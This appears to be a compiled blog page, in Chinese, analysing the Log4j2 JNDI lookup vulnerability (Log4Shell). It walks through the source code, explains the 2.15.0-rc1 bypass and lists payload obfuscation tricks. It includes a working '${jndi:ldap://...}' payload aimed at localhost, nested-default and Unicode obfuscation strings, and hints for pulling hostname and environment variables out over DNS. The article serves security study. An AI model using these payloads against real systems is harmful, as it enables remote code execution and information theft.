import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as e,o as t}from"./app-DS0ZCcmM.js";const n={};function l(p,i){return t(),a("div",null,i[0]||(i[0]=[e(`<h1 id="一文速通" tabindex="-1"><a class="header-anchor" href="#一文速通"><span>一文速通</span></a></h1><p><a href="https://tttang.com/archive/1378/#toc_rc1" target="_blank" rel="noopener noreferrer">log4j总结</a><br> 添加如下依赖</p><div class="language-xml line-numbers-mode" data-highlighter="shiki" data-ext="xml" data-title="xml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dependency</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">groupId</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;org.apache.logging.log4j&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">groupId</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">artifactId</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;log4j-core&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">artifactId</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;2.14.0&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dependency</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dependency</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">groupId</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;org.apache.logging.log4j&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">groupId</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">artifactId</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;log4j-api&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">artifactId</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;2.14.0&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dependency</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>Apache Log4j 2.x &lt;= 2.14.1</li></ul><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">package</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;"> org.example.spring.</span><span style="--shiki-light:#000000;--shiki-dark:#FFFFFF;">L</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">og42_</span><span style="--shiki-light:#000000;--shiki-dark:#FFFFFF;">T</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">est</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">  </span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> org.apache.logging.log4j.LogManager</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">  </span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> org.apache.logging.log4j.Logger</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">  </span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> Test</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">  </span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    private</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">  static</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">  Logger</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> logger </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> LogManager</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getLogger</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">Test</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">class</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">  </span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> static</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">  void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> main</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">String</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[] </span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">args</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    {  </span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        System</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setProperty</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;true&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);  </span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">        String</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> payload</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;\${jndi:ldap://127.0.0.1:4444/test}&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;  </span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        logger</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">error</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(payload);  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    }</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>直接触发<br><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917222212.png" alt="image.png" loading="lazy"></p><h2 id="漏洞分析" tabindex="-1"><a class="header-anchor" href="#漏洞分析"><span>漏洞分析</span></a></h2><p>从入口处开始跟进<br> 前面都是日志记录等级的判断，跟到关键方法 <code>AbstractLogger#logMessage</code><br><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917222750.png" alt="image.png" loading="lazy"></p><p>继续跟进<br><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917222907.png" alt="image.png" loading="lazy"></p><p>调用覆写的log方法<br><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917223201.png" alt="image.png" loading="lazy"></p><p>LoggerConfig#log此处会将我们需要记录的字符串初始化进一个LogEvent<br> 持续跟进，直到来到MessagePatternConverter#format 开始处理我们的message<br><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917223939.png" alt="image.png" loading="lazy"></p><p>判断有无\${的连续字符</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917224826.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><p>调用 <code>StrSubstitutor#replace</code> 方法进行字符替换操作</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917225750.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><p>该方法提供了<code>DEFAULT_ESCAPE</code> 是 <code>$</code>，<code>DEFAULT_PREFIX</code> 前缀是 <code>\${</code>，<code>DEFAULT_SUFFIX</code> 后缀是 <code>}</code>，<code>DEFAULT_VALUE_DELIMITER_STRING</code> 赋值分隔符是 <code>:-</code>，<code>ESCAPE_DELIMITER_STRING</code> 是 <code>:\\-</code></p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917230700.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><p>通过while循环逐个字符寻找\${开头</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917230830.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><p>找到前缀开始寻找后缀但是在找后缀的 while 循环里，又判断了是否替换变量中的值，如果替换，则再匹配一次前缀，如果又找到了前缀，则 continue 跳出循环，再走一次找后缀的逻辑，用来满足变量中嵌套的情况。<br> 后续通过多个if else 来匹配 <code>:-</code> 和 <code>:\\-</code>。<br> - <code>:-</code> 是一个赋值关键字，如果程序处理到 <code>\${aaaa:-bbbb}</code> 这样的字符串，处理的结果将会是 <code>bbbb</code>，<code>:-</code> 关键字将会被截取掉，而之前的字符串都会被舍弃掉。<br> - <code>:\\-</code> 是转义的 <code>:-</code>，如果一个用 <code>a:b</code> 表示的键值对的 key <code>a</code> 中包含 <code>:</code>，则需要使用转义来配合处理，例如 <code>\${aaa:\\\\-bbb:-ccc}</code>，代表 key 是，<code>aaa:bbb</code>，value 是 <code>ccc</code>。</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918125824.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><p>当没有到找变量赋值或处理完赋值结果之后，就会调用<code>resolveVariable</code> 方法解析满足 Lookup 功能的语法，并执行相应的 lookup ，将返回的结果替换回原字符串后，再次调用 <code>substitute</code> 方法进行递归解析。</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918130000.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><h3 id="lookup处理" tabindex="-1"><a class="header-anchor" href="#lookup处理"><span>lookup处理</span></a></h3><p>Log4j2 使用 <code>org.apache.logging.log4j.core.lookup.Interpolator</code> 类来代理所有的 <code>StrLookup</code> 实现类。也就是说在实际使用 Lookup 功能时，由 Interpolator 这个类来处理和分发。</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918130814.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918131436.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><p>在lookup函数中，通过分隔符:来分割关键字及其参数，从<code>strLookupMap</code> 中根据关键字作为 key 匹配到对应的处理类，并调用其 lookup 方法</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918131658.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><p>当关键字为jndi时，这里实际上调用的时JndiLookup,看下这个方法的处理</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918132552.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><p>log4j2通过jndiManager来支持jndi的查询<br><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918132659.png" alt="image.png" loading="lazy"></p><p>最终触发点为jndiManager#lookup</p><h2 id="bypass" tabindex="-1"><a class="header-anchor" href="#bypass"><span>Bypass</span></a></h2><h3 id="rc1" tabindex="-1"><a class="header-anchor" href="#rc1"><span>rc1</span></a></h3><p>log4j版本为2.15.0<br> 移除了从 Properties 中获取 Lookup 配置的选项，并修改判断逻辑，默认不开启 lookup 功能。</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918140210.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><p>并在 MessagePatternConverter 类中创建了内部类 <code>SimpleMessagePatternConverter</code>、<code>FormattedMessagePatternConverter</code>、<code>LookupMessagePatternConverter</code>、<code>RenderingPatternConverter</code>，将一些扩展的功能进行模块化的处理，而只有在开启 lookup 功能时才会使用 <code>LookupMessagePatternConverter</code> 来进行 Lookup 和替换。</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918140303.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><p>在默认情况下，将使用 <code>SimpleMessagePatternConverter</code> 进行消息的格式化处理，不会解析其中的 <code>\${}</code> 关键字。</p><p>第二个关键位置是 <code>JndiManager#lookup</code> 方法中添加了校验，使用了 JndiManagerFactory 来创建 JndiManager 实例，不再使用 InitialContext，而是使用子类 InitialDirContext，并为其添加白名单 JNDI 协议、白名单主机名、白名单类名。其中 <code>permanentAllowedHosts</code> 是本地 IP，<code>permanentAllowedClasses</code> 是八大基础数据类型加 <code>Character</code>，<code>permanentAllowedProtocols</code> 包含 java/ldap/ldaps。</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918140527.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><p>在lookup函数中添加了判断</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918140817.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><p>当程序异常时，会捕获异常，但并没有return,可以走到后面的lookup,例如在url中添加空格，该利用点需要手动开启lookup支持，并在后续被修复</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918140927.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><h3 id="tricks" tabindex="-1"><a class="header-anchor" href="#tricks"><span>tricks</span></a></h3><p>一些用于混淆的技巧，记录一下<br> 利用赋值的技巧，可以混淆为</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>\${\${:::::-j}\${what:-n}\${ls:-d}\${1QAZ2wxs:-i}:ldap://127.0.0.1:4444/test}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>当然可以继续嵌套</p><p>在浅蓝师傅发的<a href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg" target="_blank" rel="noopener noreferrer">公众号</a>中，利用了 UpperLookup 调用字符串的 <code>toUpperCase</code> 方法可以将不同 Locale 转为 Unicode Standard 字符的特性，例如将 Turkish 的 ı（\\u0131） 经过 <code>toUpperCase</code> 转为 I（\\u0069）。</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918145001.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><p>通过dnslog外带，配合<code>\${hostName}</code>、<code>\${env:USERDOMAIN}</code>、<code>\${env:COMPUTERNAME}</code>来获取信息<br><a href="https://www.cnblogs.com/peterpan0707007/p/15772359.html" target="_blank" rel="noopener noreferrer">log4j实战技巧</a></p>`,53)]))}const h=s(n,[["render",l],["__file","一文速通.html.vue"]]),o=JSON.parse('{"path":"/Java%E5%AD%A6%E4%B9%A0/Log4j/%E4%B8%80%E6%96%87%E9%80%9F%E9%80%9A.html","title":"一文速通","lang":"zh-CN","frontmatter":{"description":"一文速通 log4j总结 添加如下依赖 Apache Log4j 2.x <= 2.14.1 直接触发 image.png 漏洞分析 从入口处开始跟进 前面都是日志记录等级的判断，跟到关键方法 AbstractLogger#logMessage image.png 继续跟进 image.png 调用覆写的log方法 image.png LoggerCo...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/Java%E5%AD%A6%E4%B9%A0/Log4j/%E4%B8%80%E6%96%87%E9%80%9F%E9%80%9A.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"一文速通"}],["meta",{"property":"og:description","content":"一文速通 log4j总结 添加如下依赖 Apache Log4j 2.x <= 2.14.1 直接触发 image.png 漏洞分析 从入口处开始跟进 前面都是日志记录等级的判断，跟到关键方法 AbstractLogger#logMessage image.png 继续跟进 image.png 调用覆写的log方法 image.png LoggerCo..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917222212.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"一文速通\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917222212.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917222750.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917222907.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917223201.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917223939.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917224826.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917225750.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917230700.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240917230830.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918125824.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918130000.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918130814.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918131436.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918131658.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918132552.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918132659.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918140210.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918140303.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918140527.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918140817.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918140927.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/20240918145001.png\\"],\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":2,"title":"漏洞分析","slug":"漏洞分析","link":"#漏洞分析","children":[{"level":3,"title":"lookup处理","slug":"lookup处理","link":"#lookup处理","children":[]}]},{"level":2,"title":"Bypass","slug":"bypass","link":"#bypass","children":[{"level":3,"title":"rc1","slug":"rc1","link":"#rc1","children":[]},{"level":3,"title":"tricks","slug":"tricks","link":"#tricks","children":[]}]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":3.7,"words":1109},"filePathRelative":"Java学习/Log4j/一文速通.md","localizedDate":"2025年1月16日","excerpt":"\\n<p><a href=\\"https://tttang.com/archive/1378/#toc_rc1\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">log4j总结</a><br>\\n添加如下依赖</p>\\n<div class=\\"language-xml line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"xml\\" data-title=\\"xml\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&lt;</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">dependency</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&gt;  </span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&lt;</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">groupId</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&gt;org.apache.logging.log4j&lt;/</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">groupId</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&gt;  </span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&lt;</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">artifactId</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&gt;log4j-core&lt;/</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">artifactId</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&gt;  </span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&lt;</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">version</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&gt;2.14.0&lt;/</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">version</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&gt;  </span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&lt;/</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">dependency</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&gt;  </span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">  </span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&lt;</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">dependency</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&gt;  </span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&lt;</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">groupId</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&gt;org.apache.logging.log4j&lt;/</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">groupId</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&gt;  </span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&lt;</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">artifactId</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&gt;log4j-api&lt;/</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">artifactId</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&gt;  </span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&lt;</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">version</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&gt;2.14.0&lt;/</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">version</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&gt;  </span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&lt;/</span><span style=\\"--shiki-light:#E45649;--shiki-dark:#E06C75\\">dependency</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">&gt;</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div>","autoDesc":true}');export{h as comp,o as data};
